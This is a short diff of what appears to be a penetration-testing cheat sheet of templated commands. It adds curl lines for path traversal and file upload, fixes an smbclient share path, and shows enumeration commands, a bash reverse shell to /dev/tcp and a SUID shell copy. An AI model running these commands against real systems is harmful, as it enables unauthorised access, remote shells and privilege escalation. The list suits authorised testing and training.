@@ -16,11 +16,13 @@ nmap -Pn -p5985-5986 IP
 nmap -6 IPv6
 dig axfr @IP DOMAIN
 smbclient -U USERNAME -L IP
-smbclient -U geust '\\IP\DIRECTORY'
+smbclient -U geust '\\IP\SHARE'
 ldapsearch -x -H ldap://IP -s base
 ldapsearch -x -H ldap://IP -b 'dc=DC0,dc=DC1'
 ldapsearch -x -H ldap://IP -D USERNAME@DOMAIN -w PASSWORD -b 'dc=DC0,dc=DC1'
 rpcclient -U USERNAME IP
+curl --path-as-is URL
+curl -X POST -F "ARG=@PATH;filename=FILE;type=TYPE" URL
 curl -u USERNAME:PASSWORD pop3://IP
 bash -i >& /dev/tcp/IP/PORT 0>&1
 cp /bin/sh /tmp/sh && chmod +s /tmp/sh
